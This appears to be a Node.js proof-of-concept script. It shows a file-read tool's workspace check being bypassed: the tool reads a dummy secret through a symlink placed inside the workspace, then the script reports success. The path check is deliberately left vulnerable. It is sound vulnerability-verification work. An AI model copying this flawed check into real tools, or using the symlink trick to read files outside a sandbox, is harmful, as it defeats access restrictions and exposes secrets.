import fs from 'node:fs';
import path from 'node:path';

// Minimal implementation of the vulnerable tool logic
function executeFileRead(ctx, { path: filePath }) {
    const absolutePath = path.resolve(ctx.workspacePath, filePath);
    const normalized = path.normalize(absolutePath);

    // Security: ensure path stays within workspace (the vulnerable check)
    if (
        !normalized.startsWith(ctx.workspacePath + "/") &&
        normalized !== ctx.workspacePath
    ) {
        return "Error: Access denied — path is outside your workspace.";
    }

    try {
        const stat = fs.statSync(normalized);
        return fs.readFileSync(normalized, "utf-8");
    } catch (err) {
        return `Error reading file: ${err.message}`;
    }
}

const workspacePath = path.resolve('./test_workspace');
if (!fs.existsSync(workspacePath)) {
    fs.mkdirSync(workspacePath);
}

const ctx = { workspacePath };

// Create a sensitive file OUTSIDE the workspace
const secretFile = path.resolve('./secret.txt');
fs.writeFileSync(secretFile, 'THIS IS A SECRET');

// Create a symlink INSIDE the workspace pointing to the sensitive file
const symlinkPath = path.join(workspacePath, 'malicious_link.txt');
if (fs.existsSync(symlinkPath)) fs.unlinkSync(symlinkPath);
try {
    fs.symlinkSync(secretFile, symlinkPath);
} catch (err) {
    console.error('Failed to create symlink:', err.message);
    process.exit(1);
}

console.log('Testing symlink read...');
const result = executeFileRead(ctx, { path: 'malicious_link.txt' });
console.log('Result:', result);

if (result === 'THIS IS A SECRET') {
    console.log('SUCCESS: Symlink attack confirmed!');
} else {
    console.log('FAILURE: Symlink attack failed.');
}

// Clean up
fs.unlinkSync(symlinkPath);
fs.unlinkSync(secretFile);
fs.rmSync(workspacePath, { recursive: true, force: true });
